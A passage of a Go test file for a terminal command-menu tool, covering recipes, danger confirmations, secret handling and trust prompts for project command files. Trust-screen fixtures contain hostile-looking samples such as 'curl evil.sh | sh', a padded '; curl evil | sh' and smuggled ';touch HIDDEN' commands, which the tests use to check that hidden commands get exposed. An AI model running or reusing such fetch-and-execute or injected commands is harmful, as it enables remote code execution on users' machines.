	if m.run != nil || len(m.recipe) != 2 {
		t.Fatalf("still there after a second run: run %+v, recipe %v", m.run, m.recipe)
	}
	sent = []string{"one", "two"}
	// Finished, the commands are as they were.
	m.showSection(&m.opt.Config.Sections[0])
	on("other")
	right()
	sentIs("one two other")
	m.Update(idleMsg{seq: m.runSeq, ok: true})

	// A failed step stops it there, and keeps the recipe to look at.
	build("one", "bad", "two")
	start()
	done(true)
	failed = true
	done(true)
	failed = false
	sentIs("one bad")
	if m.run != nil || len(m.recipe) != 3 || !strings.Contains(m.errMsg, "step 2, bad: it failed") {
		t.Fatalf("run %+v, recipe %v, err %q", m.run, m.recipe, m.errMsg)
	}
	start() // and it can go again, from the top
	sentIs("one bad one")
	m.Update(typed("x")) // x stops it, with what's running left to finish
	if m.run != nil || len(m.recipe) != 0 || !strings.Contains(m.hint, "stopped and cleared") {
		t.Fatalf("run %+v, recipe %v, hint %q", m.run, m.recipe, m.hint)
	}
	m.Update(idleMsg{seq: m.runSeq, ok: true})
	sentIs("one bad one")

	// Blanks are asked for when the step's reached, not before.
	build("one", "ask", "two")
	start()
	sentIs("one")
	done(true)
	if m.mode != modeFill || m.job == nil || m.job.ref.cmd.Name != "ask" {
		t.Fatalf("it should ask now: mode %v", m.mode)
	}
	m.Update(typed("v"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	sentIs("one ask v")
	done(true)
	sentIs("one ask v two")
	done(true)

	// Backing out of a step's blanks stops the recipe, and keeps it.
	build("ask", "two")
	start()
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	sentIs("")
	if m.run != nil || m.mode != modeBrowse || len(m.recipe) != 2 || !strings.Contains(m.hint, "stopped at step 1") {
		t.Fatalf("run %+v, mode %v, recipe %v, hint %q", m.run, m.mode, m.recipe, m.hint)
	}

	// A risky step still asks, and "no" stops there.
	build("one", "risky", "two")
	start()
	done(true)
	if m.mode != modeConfirm {
		t.Fatalf("a risky step should ask, mode %v", m.mode)
	}
	m.Update(typed("n"))
	sentIs("one")
	if m.run != nil || len(m.recipe) != 3 || !strings.Contains(m.hint, "stopped at step 2") {
		t.Fatalf("run %+v, hint %q", m.run, m.hint)
	}
	// "yes" goes on.
	start()
	done(true)
	m.Update(typed("y"))
	sentIs("one one risky")
	done(true)
	sentIs("one one risky two")
	done(true)

	// A shell left mid-command is no place for the next step.
	build("one", "two")
	start()
	shell = ShellState{Typed: unfinishedCommand}
	done(true)
	sentIs("one")
	if m.run != nil || !strings.Contains(m.errMsg, "still waiting") {
		t.Fatalf("run %+v, err %q", m.run, m.errMsg)
	}
	shell = ShellState{}

	// Not knowing whether it finished stops it too.
	build("one", "two")
	start()
	done(false)
	sentIs("one")
	if m.run != nil || !strings.Contains(m.errMsg, "couldn't tell") {
		t.Fatalf("run %+v, err %q", m.run, m.errMsg)
	}

	// x says so when there's a recipe; with none, an x is just a stray letter.
	build("one")
	m.Update(typed("x"))
	if len(m.recipe) != 0 || m.hint != "Recipe cleared" {
		t.Errorf("recipe %v, hint %q", m.recipe, m.hint)
	}
	m.Update(typed("x"))
	if m.hint != "Press / to filter" {
		t.Errorf("hint = %q", m.hint)
	}
	// A section row still opens, recipe or not.
	build("one")
	m.showRoot("")
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	if m.section == nil {
		t.Error("→ on a section should open it")
	}
}

// Focus comes back to the menu only when the recipe needs it, or it's over.
func TestRecipeFocusComesBackWhenNeeded(t *testing.T) {
	focused := 0
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "a", Cmd: "a"}, {Name: "b", Cmd: "b"}, {Name: "c", Cmd: "c <what>", Args: []config.Arg{{Name: "what"}}},
	}}}}, Send: func(string) error { return nil }, WaitIdle: func() bool { return true }, FocusMenu: func() { focused++ },
		Builtin: func() []*config.Section {
			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	for i := range 3 {
		m.list.cursor = i + 1
		m.Update(typed(fmt.Sprint(i + 1)))
	}
	m.Update(typed("r"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	want := func(n int, when string) {
		t.Helper()
		if focused != n {
			t.Errorf("%s: focus brought back %d times, want %d", when, focused, n)
		}
	}
	m.Update(idleMsg{seq: m.run.seq, ok: true})
	want(0, "going straight on to the next step")
	m.Update(idleMsg{seq: m.run.seq, ok: true})
	want(1, "at a step with a blank")
	m.Update(tea.FocusMsg{}) // that focus arriving: the user is here now
	m.Update(typed("v"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.BlurMsg{})
	m.Update(tea.FocusMsg{}) // a late one from earlier mustn't cost the last return
	m.Update(idleMsg{seq: m.run.seq, ok: true})
	want(2, "at the end")
}

// The bar reaches its pane without going through the renderer: it has to be in
// the palette's 256 colours by itself, with every colour still there.
func TestBarIsDrawnIn256Colours(t *testing.T) {
	var drawn string
	m := New(Options{Config: &config.Config{Sections: []config.Section{
		{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "a", Cmd: "a"}}},
	}}, Send: func(string) error { return nil }, Bar: func(l string) { drawn = l }, BarWidth: func() int { return 40 }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	_, cmd := m.Update(typed("1"))
	if cmd == nil {
		t.Fatal("the bar should redraw")
	}
	if batch, ok := cmd().(tea.BatchMsg); ok {
		for _, c := range batch {
			if c != nil {
				c()
			}
		}
	}
	if strings.Contains(drawn, "38;2;") || strings.Contains(drawn, "48;2;") {
		t.Errorf("24-bit colour in the bar: %q", drawn)
	}
	for _, want := range []string{"38;5;79", "48;5;212", "48;5;235"} { // the name, the badge, the band
		if !strings.Contains(drawn, want) {
			t.Errorf("no %s in the bar: %q", want, drawn)
		}
	}
	if got := ansi.Strip(drawn); ansi.StringWidth(got) != 40 || !strings.Contains(got, "1  a") {
		t.Errorf("the text should be untouched: %q", got)
	}
}

func TestFillInNamesTheCommand(t *testing.T) {
	args := []config.Arg{{Name: "count"}, {Name: "kind", Options: []config.Option{{Value: "x"}, {Value: "y"}}}}
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "First", Cmd: "first"},
		{Name: "Biggest things here", Cmd: "big <count> <kind>", Args: args},
	}}}}, Send: func(string) error { return nil }, WaitIdle: func() bool { return true }, Builtin: func() []*config.Section {
		return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
	}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.list.cursor = 2
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	lines := func(w, h int) []string { return strings.Split(ansi.Strip(m.fillView(w, h)), "\n") }
	got := lines(60, 20)
	if got[0] != "BIGGEST THINGS HERE" || got[1] != "" || !strings.HasPrefix(got[2], "count  1/2") || !strings.HasPrefix(got[3], "❯") {
		t.Errorf("name, a blank line, then the arg and its input:\n%q", got[:4])
	}
	if head := lines(10, 20)[0]; ansi.StringWidth(head) > 10 || !strings.HasSuffix(head, "…") {
		t.Errorf("a long name should fit: %q", head)
	}
	if got := lines(60, 5); !strings.HasPrefix(got[0], "count") {
		t.Errorf("no room: the input matters more than the name: %q", got)
	}

	// A pick list keeps its rows in the height it's given, header and all.
	m.Update(typed("3"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if got := lines(60, 8); got[0] != "BIGGEST THINGS HERE" || !strings.HasPrefix(got[2], "kind  2/2") || len(got) > 8 {
		t.Errorf("pick list: %q", got)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	if m.mode != modeBrowse {
		t.Fatalf("← should leave the command, mode %v", m.mode)
	}

	// As a step of a recipe, it says which.
	m.showSection(&m.opt.Config.Sections[0])
	m.list.cursor = 1
	m.Update(typed("1"))
	m.list.cursor = 2
	m.Update(typed("2"))
	m.Update(typed("r"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	m.Update(idleMsg{seq: m.run.seq, ok: true})
	if head := lines(60, 20)[0]; head != "BIGGEST THINGS HERE · step 2 of 2" {
		t.Errorf("head = %q", head)
	}
	if head := lines(20, 20)[0]; ansi.StringWidth(head) > 20 || !strings.HasSuffix(head, " · step 2 of 2") {
		t.Errorf("a long name gives way to the step: %q", head)
	}
}

func TestRiskyScreensNameTheCommand(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Burn it", Cmd: "burn", Risk: config.RiskDanger},
		{Name: "First", Cmd: "first"},
		{Name: "Stop it", Cmd: "stop", Risk: config.RiskWarn},
	}}}}, Send: func(string) error { return nil }, WaitIdle: func() bool { return true }, Builtin: func() []*config.Section {
		return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
	}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	on := func(name string) {
		t.Helper()
		m.showSection(&m.opt.Config.Sections[0])
		for i, it := range m.list.view {
			if it.title == name {
				m.list.cursor = i
			}
		}
	}
	lines := func(h int) []string { return strings.Split(ansi.Strip(m.confirmView(60, h)), "\n") }

	on("Stop it")
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	got := lines(20)
	if got[0] != "STOP IT" || got[1] != "" || !strings.Contains(got[2], "This command is risky") {
		t.Errorf("warn: %q", got)
	}
	if got := lines(5); !strings.Contains(got[0], "This command is risky") || len(got) != 4 {
		t.Errorf("no room: the question and answers come first: %q", got)
	}
	m.Update(typed("n"))

	// A dangerous one, through both of its screens.
	on("Burn it")
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	got = lines(20)
	if got[0] != "BURN IT" || got[1] != "" || got[2] != "burn" || !strings.Contains(got[4], dangerGlyph+" It can't be undone") {
		t.Errorf("danger: %q", got)
	}
	m.Update(typed(m.pending.code))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	got = lines(20)
	if got[0] != "BURN IT" || !strings.Contains(got[2], "Last check") {
		t.Errorf("last check: %q", got)
	}
	m.Update(typed("n"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	m.mode, m.pending = modeBrowse, nil

	// As a step of a recipe, it says which.
	on("First")
	m.Update(typed("1"))
	on("Stop it")
	m.Update(typed("2"))
	m.Update(typed("r"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	m.Update(idleMsg{seq: m.run.seq, ok: true})
	if got := lines(20); got[0] != "STOP IT · step 2 of 2" {
		t.Errorf("as a step: %q", got)
	}
}

func TestStatusBarShowsTheRecipe(t *testing.T) {
	shell := ShellState{}
	m := New(Options{Config: &config.Config{Sections: []config.Section{
		{Name: "AWS", Icon: "•", Category: config.Other, Commands: []config.Command{
			{Name: "List buckets", Cmd: "aws s3 ls"}, {Name: "Who am I", Cmd: "aws sts get-caller-identity"},
		}},
		{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Status", Cmd: "git status"}}},
		{Name: "Nope", Icon: "•", Category: config.Other, Needs: []string{"clingon-test-nope"}, Commands: []config.Command{{Name: "Go", Cmd: "x"}}},
	}}, Send: func(string) error { return nil }, Shell: func() ShellState { return shell }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.news = &Headline{Text: "✓ some news"}
	barIs := func(w int, want string) {
		t.Helper()
		line := m.statusBar(w)
		if got := strings.TrimSpace(ansi.Strip(line)); got != want {
			t.Errorf("at %d cells: got %q, want %q", w, got, want)
		}
		if got := ansi.StringWidth(line); got != w {
			t.Errorf("the bar should be %d cells wide, got %d: %q", w, got, ansi.Strip(line))
		}
	}
	barIs(80, "✓ some news")

	// Across sections: listed by number, wherever you are.
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(typed("1"))
	m.showSection(&m.opt.Config.Sections[1])
	m.Update(typed("2"))
	want := "Recipe  1  List buckets →  2  Status"
	barIs(80, want)
	m.showRoot("")
	barIs(80, want) // instead of the news

	// Not enough room: names give way, numbers never do.
	barIs(29, "Recipe  1  Lis… →  2  Sta…")
	barIs(22, "Recipe  1  … →  2  …")
	barIs(20, "Recipe  1   →  2")

	// A warning about the shell still comes first, and passes.
	shell = ShellState{Typed: "git sta"}
	m.readShell()
	barIs(80, "✎ Typed in the shell: git sta · running a command asks first")
	shell = ShellState{}
	m.readShell()
	barIs(80, want)

	// Missing tools aren't hidden by it: they share the bar.
	m.showSection(&m.opt.Config.Sections[2])
	line := ansi.Strip(m.statusBar(120))
	if !strings.Contains(line, "✗ Needs clingon-test-nope") || !strings.Contains(line, want) {
		t.Errorf("both should show, got %q", line)
	}
	if got := ansi.StringWidth(m.statusBar(120)); got != 120 {
		t.Errorf("the split bar should be 120 cells wide, got %d", got)
	}

	// Taking the numbers off brings back what was there.
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(typed("1"))
	barIs(80, "Recipe  1  Status") // the rest close up
	m.showSection(&m.opt.Config.Sections[1])
	m.Update(typed("1"))
	m.showRoot("")
	barIs(80, "✓ some news")
}

func TestTypedShellAsksFirst(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "List", Cmd: "ls"}}}
	var sent []string
	shell := ShellState{Typed: "git sta"}
	cleared, focused := 0, 0
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send:       func(c string) error { sent = append(sent, c); return nil },
		Shell:      func() ShellState { return shell },
		ClearShell: func() error { cleared++; shell = ShellState{}; return nil },
		FocusShell: func() { focused++ }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.Update(tea.FocusMsg{})
	m.showSection(&m.opt.Config.Sections[0])
	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "Typed in the shell: git sta") {
		t.Errorf("the status bar should say what's typed, got %q", bar)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.mode != modeTyped || m.yes || len(sent) != 0 {
		t.Fatalf("want the question, with No first: mode %v sent %v", m.mode, sent)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter}) // No, take me to the shell
	if focused != 1 || len(sent) != 0 || m.mode != modeBrowse {
		t.Fatalf("No goes to the shell and sends nothing: focused %d sent %v", focused, sent)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(typed("y")) // Yes, clear it and run
	if cleared != 1 || len(sent) != 1 || sent[0] != "ls" {
		t.Fatalf("Yes clears the prompt, then sends: cleared %d sent %v", cleared, sent)
	}
}

func TestScrolledBackShellHoldsCommands(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "List", Cmd: "ls"}}}
	shell := ShellState{Scrolling: true}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }, Shell: func() ShellState { return shell }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.FocusMsg{})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 0 || m.list.selected().disabled {
		t.Fatal("nothing can be sent into a scrolled-back shell, though the row isn't greyed")
	}
	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "scrolled back") {
		t.Errorf("the status bar should say why, got %q", bar)
	}
	shell = ShellState{}
	m.Update(tea.FocusMsg{}) // back after pressing q there
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 {
		t.Fatalf("once it's back at the prompt, commands run: %v", sent)
	}
}

func TestBracketsJumpInEveryTerminal(t *testing.T) {
	p := newPicker([]item{{title: "A", header: true}, {title: "a1"}, {title: "B", header: true}, {title: "b1"}}, nil, false)
	p.update(typed("]"))
	if p.selected().title != "b1" || p.query() != "" {
		t.Fatalf("] should jump, not type: at %s, filter %q", p.selected().title, p.query())
	}
	p.update(typed("["))
	if p.selected().title != "a1" {
		t.Fatalf("[ should jump back: at %s", p.selected().title)
	}
}

func TestChecklistDefaultsStartTicked(t *testing.T) {
	join := " && "
	sec := config.Section{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Settings", Cmd: "<s>", Args: []config.Arg{{Name: "s", Type: "flags", Join: &join, Default: "a 1 && c 3",
			Options: []config.Option{{Value: "a 1"}, {Value: "b 2"}, {Value: "c 3"}}}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }, Dir: func() string { return t.TempDir() }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || sent[0] != "a 1 && c 3" {
		t.Fatalf("want the defaults ticked, got %v", sent)
	}
}

func TestStatusBarSaysWhenAToolIsMissing(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	if err := os.MkdirAll(filepath.Join(home, "go", "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(home, "go", "bin", "clingon-test-gopls"), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	cmd := []config.Command{{Name: "Run", Cmd: "true"}}
	cfg := &config.Config{Sections: []config.Section{
		{Name: "Gone", Icon: "•", Category: config.Other, Commands: cmd, Needs: []string{"clingon-test-nope"}},
		{Name: "Hidden", Icon: "•", Category: config.Other, Commands: cmd, Needs: []string{"clingon-test-gopls"}},
		{Name: "Shell", Icon: "•", Category: config.Other, Commands: cmd, Needs: []string{"sh"}},
	}}
	news := Headline{Kind: Attention, Text: "↻ 2 pack updates for git, docker"}
	m := New(Options{Config: cfg, Dir: func() string { return t.TempDir() }, Headline: func() Headline { return news }})
	m.Update(tea.WindowSizeMsg{Width: 200, Height: 40})
	bar := func() string {
		b := m.statusBar(200)
		if ansi.StringWidth(b) != 200 {
			t.Errorf("the bar should fill the width, got %d", ansi.StringWidth(b))
		}
		return strings.TrimSpace(ansi.Strip(b))
	}
	if bar() != news.Text { // the top level has news; missing tools are for sections
		t.Errorf("top menu: got %q, want %q", bar(), news.Text)
	}
	for i, want := range []string{"✗ Needs clingon-test-nope (not installed)", "✗ Needs clingon-test-gopls (not on PATH: it's in ~/go/bin)", "✓ Everything Shell needs is installed"} {
		m.showSection(&cfg.Sections[i])
		if bar() != want {
			t.Errorf("%s: got %q, want %q", cfg.Sections[i].Name, bar(), want)
		}
	}
	if !strings.HasSuffix(strings.TrimSpace(ansi.Strip(m.view())), "✓ Everything Shell needs is installed") {
		t.Error("the status bar should be the last line, under the key hints")
	}
}

func TestWhenGreysOutAwayFromItsFiles(t *testing.T) {
	repo, elsewhere := t.TempDir(), t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(repo, "src", "deep"), 0o755); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(repo, "src", "deep") // a folder above has .git
	sec := config.Section{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Status", Cmd: "git status", When: []string{".git"}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }, Dir: func() string { return dir }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	if m.list.selected().disabled {
		t.Fatal("a .git above the folder counts")
	}
	dir = elsewhere
	m.Update(tea.FocusMsg{}) // back from the shell, after a cd
	if !m.list.items[1].disabled {
		t.Fatal("away from .git it should be greyed out")
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 0 || m.mode != modeBrowse {
		t.Fatal("a greyed-out command doesn't run")
	}
	dir = filepath.Join(repo, "src", "deep")
	m.Update(tea.FocusMsg{}) // and back in the repo
	if it := m.list.selected(); it == nil || it.title != "Status" {
		t.Fatalf("usable again: the cursor goes back to it, got %+v", it)
	}
}

func TestDangerMeansTypingACode(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Drop", Cmd: "dropdb <db>", Risk: config.RiskDanger, Args: []config.Arg{{Name: "db"}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	typ := func(s string) { m.Update(typed(s)) }
	enter := tea.KeyPressMsg{Code: tea.KeyEnter}
	if !strings.Contains(m.list.render(60, 10), dangerGlyph) {
		t.Error("danger commands are marked ☠")
	}
	m.Update(enter)
	typ("prod")
	m.Update(enter)
	if m.mode != modeConfirm || m.pending.typed {
		t.Fatal("want the type-the-code screen")
	}
	code := m.pending.code
	if len(code) != 4 || !strings.Contains(m.View().Content, code) {
		t.Fatalf("want a 4-letter code on screen, got %q", code)
	}
	m.Update(enter) // nothing typed: refused
	typ("dropdb prod")
	m.Update(enter) // wrong: refused, with a new code
	if !m.wrong || m.pending.typed || len(sent) != 0 || m.word.Value() != "" {
		t.Fatal("a mismatch shouldn't get through, and clears the box")
	}
	for _, near := range []func(string) string{strings.ToUpper, func(c string) string { return " " + c }, func(c string) string { return c + " " }} {
		typ(near(m.pending.code)) // each miss brings a new code, so build from the current one
		m.Update(enter)           // exactly the code: case and spaces count
		if m.pending.typed {
			t.Fatal("only the exact code gets through")
		}
	}
	typ(m.pending.code)
	m.Update(enter)
	if !m.pending.typed || m.yes {
		t.Fatal("typed right: now No/Yes, with No first")
	}
	m.Update(typed("y"))
	if len(sent) != 1 || sent[0] != "dropdb prod" {
		t.Fatalf("got %v", sent)
	}
}

func TestPatternRefusesBadValues(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Kill", Cmd: "kill-port <port>", Args: []config.Arg{{Name: "port", Pattern: "[0-9]+", Placeholder: "3000"}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(typed("80a"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 0 || !strings.Contains(m.job.invalid, "For example: 3000") {
		t.Fatalf("80a isn't a port: sent %v, said %q", sent, m.job.invalid)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyBackspace})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || sent[0] != "kill-port 80" {
		t.Fatalf("got %v", sent)
	}
}

func TestSecretsNeverReachTheScreenOrHistory(t *testing.T) {
	dir := t.TempDir()
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Connect", Cmd: "psql <url>", Args: []config.Arg{{Name: "url", Type: "secret", Desc: "On <url>."}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, SecretDir: dir,
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(typed("postgres://me:hunter2@db"))
	if v := ansi.Strip(m.view()); strings.Contains(v, "hunter2") {
		t.Fatalf("the secret is on screen:\n%s", v)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || strings.Contains(sent[0], "hunter2") || !strings.Contains(sent[0], "$(cat ") {
		t.Fatalf("the shell should get a reference, not the secret: %v", sent)
	}
	out, err := exec.Command("sh", "-c", "printf %s "+strings.TrimPrefix(sent[0], "psql ")).Output()
	if err != nil || string(out) != "postgres://me:hunter2@db" {
		t.Fatalf("the reference should give the secret back once: %q %v", out, err)
	}
	if left, _ := filepath.Glob(filepath.Join(dir, "secret-*")); len(left) != 0 {
		t.Errorf("the file should be gone after it's read: %v", left)
	}
}

func TestProjectPacksAskFirst(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte("sections:\n  - name: Deploy\n    groups:\n      - name: Prod\n        commands:\n          - name: Ship it\n            cmd: ./ship.sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Status", Cmd: "git status"}}}}}
	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
	m.showRoot("")
	if it := m.list.selected(); it == nil || it.title != "Use this folder's commands?" {
		t.Fatalf("an untrusted project asks first, got %+v", it)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.mode != modeTrust || !strings.Contains(ansi.Strip(m.view()), "./ship.sh") {
		t.Fatal("the trust screen should show what it would run")
	}
	m.Update(typed("y"))
	if it := m.list.selected(); it == nil || it.title != "Deploy" {
		t.Fatalf("trusted: its sections show, got %+v", it)
	}
	// Editing the file means asking again.
	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte("sections:\n  - name: Deploy\n    groups:\n      - name: Prod\n        commands:\n          - name: Ship it\n            cmd: curl evil.sh | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	m.showRoot("")
	if m.list.selected().title != "Use this folder's commands?" || !m.project.Changed {
		t.Fatal("a changed file should be untrusted again")
	}
}

func TestTrustScreenShowsEveryCommandBeforeYes(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	long := "ls " + strings.Repeat("padding ", 30) + "; curl evil | sh"
	var b strings.Builder
	b.WriteString("sections:\n  - name: Deploy\n    commands:\n")
	for i := 0; i < 40; i++ {
		fmt.Fprintf(&b, "      - name: C%d\n        cmd: echo command-%d\n", i, i)
	}
	fmt.Fprintf(&b, "      - name: Long\n        cmd: %s\n", long)
	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 24})
	m.showRoot("")
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	seen := ""
	view := ansi.Strip(m.view())
	if !strings.Contains(view, "more to read") {
		t.Fatalf("it should say there's more:\n%s", view)
	}
	m.Update(typed("y"))
	if m.mode != modeTrust {
		t.Fatal("yes shouldn't work before the end")
	}
	for i := 0; i < 300 && m.trustTop < m.trustMax; i++ {
		seen += ansi.Strip(m.view())
		m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	}
	seen += ansi.Strip(m.view())
	flat := strings.Join(strings.Fields(seen), " ")
	for i := 0; i < 40; i++ {
		if !strings.Contains(flat, fmt.Sprintf("command-%d", i)) {
			t.Errorf("command-%d was never shown", i)
		}
	}
	if !strings.Contains(flat, "curl evil | sh") {
		t.Errorf("the end of a long command should be shown:\n%s", seen)
	}
	if !strings.Contains(ansi.Strip(m.view()), "Yes, use them") {
		t.Errorf("the choices should stay on screen:\n%s", m.view())
	}
	m.Update(typed("y"))
	if m.mode == modeTrust {
		t.Fatal("at the end, yes works")
	}
}

func TestTrustScreenSpellsOutWhatWouldTakeNoRoom(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	tabs := strings.Repeat(`\\t`, 33)
	pack := "sections:\n  - name: S\n    commands:\n      - name: Run\n        cmd: \"npm test" + tabs + ";touch HIDDEN\"\n" +
		"      - name: Wide\n        cmd: \"ls \\u1160\\u1160;touch WIDE\"\n"
	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte(pack), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showRoot("")
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	view := ansi.Strip(m.view())
	if strings.Contains(view, "\t") || strings.ContainsRune(view, 0x1160) {
		t.Errorf("nothing that takes no room should be drawn:\n%q", view)
	}
	flat := strings.Join(strings.Fields(view), "")
	for _, want := range []string{`\t\t`, "HIDDEN", `\u{1160}`, "WIDE"} {
		if !strings.Contains(flat, want) {
